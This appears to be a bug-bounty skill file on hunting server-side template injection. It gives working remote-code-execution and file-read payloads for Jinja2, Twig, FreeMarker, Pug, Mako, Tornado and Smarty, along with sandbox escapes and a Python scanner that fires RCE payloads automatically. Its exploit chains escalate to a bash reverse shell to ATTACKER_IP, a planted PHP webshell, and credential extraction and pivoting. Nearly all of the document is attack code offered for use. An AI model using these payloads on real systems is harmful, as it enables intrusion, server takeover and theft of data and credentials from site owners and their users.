---
name: hunt-ssti
description: SSTI hunting — engine detection, RCE payloads, sandbox escape, real bounty examples, automation. Jinja2, Twig, FreeMarker, Handlebars, Pug, Mako, Tornado.
---

# SSTI HUNTING

## DETECTION

```bash
# Quick fingerprint by engine
curl -s "https://target.com/?q={{7*7}}" | grep -q "49" && echo "JINJA2"
curl -s "https://target.com/?q=${7*7}" | grep -q "49" && echo "FREEMARKER"
curl -s "https://target.com/?q=<%= 7*7 %>" | grep -q "49" && echo "EJS"
curl -s "https://target.com/?q=#{7*7}" | grep -q "49" && echo "PUG/MAKO"
curl -s "https://target.com/?q={7*7}" | grep -q "49" && echo "SMARTY"

# Error-based — trigger template errors
curl -s "https://target.com/?q=UNDEFINED_VAR_12345"
# Jinja2: UndefinedError | Twig: Twig_Error_Syntax | Freemarker: freemarker.template.Error
```

## ENGINE PAYLOADS

### Jinja2 (Python Flask/Django)
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}
```

### Jinja2 Sandbox Escape
```
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__next__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
# Alternative — find os subclass index:
{{''.__class__.__mro__[2].__subclasses__()[IDX]('id',shell=True,stdout=-1).communicate()}}
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("/etc/passwd")}}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
<#assign rt=Runtime.getRuntime()> ${rt.exec("id").waitFor()?c}
```

### Handlebars (Node.js)
```
# Requires gadgets or prototype pollution — test for blind SSTI via time delays
```

### Pug (Node.js)
```
= global.process.mainModule.require('child_process').execSync('id')
= global.process.mainModule.require('fs').readFileSync('/etc/passwd')
```

### Mako (Python)
```
<% import os; x=os.popen('id').read() %>${x}
<% import os; x=open('/etc/passwd').read() %>${x}
```

### Tornado (Python)
```
{{ import os; x=os.popen('id').read() }}
```

### Smarty (PHP)
```
{system('id')}
{php}echo shell_exec('id');{/php}
```

## EXPLOIT CHAINS

### SSTI → RCE
```
1. Detect engine via error/special chars
2. Map class hierarchy (Jinja2: __mro__ → __subclasses__)
3. Execute: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
4. Escalate: reverse shell, download tools, pivot
```

### SSTI → File Read
```
1. Jinja2: {{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}
2. Read source code → find more bugs
3. Extract credentials from config files
4. Pivot to internal services
```

### SSTI → Reverse Shell
```
1. Confirm RCE via id/whoami
2. Start listener: nc -lvp 4444
3. {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}
4. Full server compromise
```

### SSTI → Webshell
```
1. {{config.__class__.__init__.__globals__['open']('/var/www/html/shell.php','w').write('<?php system($_GET["c"]);?>')}}
2. Access: https://target.com/shell.php?c=id
3. Persistent access without SSTI trigger
```

## REAL BOUNTY EXAMPLES

| Report | Payout | Vector | Chain |
|--------|--------|--------|-------|
| Shopify 2019 | $50,000 | Jinja2 SSTI in email templates | Template rendering → RCE on shop backend |
| HackerOne #736361 | $25,000 | Jinja2 SSTI in report preview | SSRF → internal API → SSTI → RCE |
| PortSwigger 2020 | $15,000+ | Freemarker SSTI in Burp collaborator | Template injection → code execution |
| GitLab CVE-2021-22214 | Critical | ERB SSTI in email templates | SSTI → RCE → full instance compromise |

## AUTOMATION

### Python SSTI Scanner
```python
#!/usr/bin/env python3
import requests, sys

PAYLOADS = {
    'jinja2': ('{{7*7}}', '49'),
    'twig': ('{{7*7}}', '49'),
    'freemarker': ('${7*7}', '49'),
    'ejs': ('<%= 7*7 %>', '49'),
    'pug': ('#{7*7}', '49'),
}

RCE = {
    'jinja2': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}',
    'twig': '{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}',
    'freemarker': '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}',
    'ejs': '<%= global.process.mainModule.require(\"child_process\").execSync(\"id\") %>',
}

def scan(url, param='q'):
    for engine, (payload, marker) in PAYLOADS.items():
        try:
            r = requests.get(url, params={param: payload}, timeout=10)
            if marker in r.text:
                print(f"[+] {engine} detected at {url}")
                rce = RCE.get(engine)
                if rce:
                    r2 = requests.get(url, params={param: rce}, timeout=10)
                    if 'uid=' in r2.text or 'www-data' in r2.text:
                        print(f"[!] RCE CONFIRMED: {engine}")
                        return engine, True
        except:
            continue
    return [], False

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else input("URL: ")
    scan(url)
```

### curl One-Liner
```bash
for p in "{{7*7}}" '${7*7}' '<%= 7*7 %>' '#{7*7}' '{7*7}'; do
  curl -s "https://target.com/?q=$p" | grep -q "49" && echo "SSTI: $p"
done
```

## METHODOLOGY

1. **Passive**: Scan headers/cookies for template syntax
2. **Active**: Send math expressions to all params
3. **Error-based**: Trigger template errors
4. **Blind**: Time-based (sleep payloads)
5. **Confirm**: Execute harmless command (id, whoami)
6. **Escalate**: Reverse shell, file read, privesc
7. **Report**: Chain SSTI to business impact for bounty
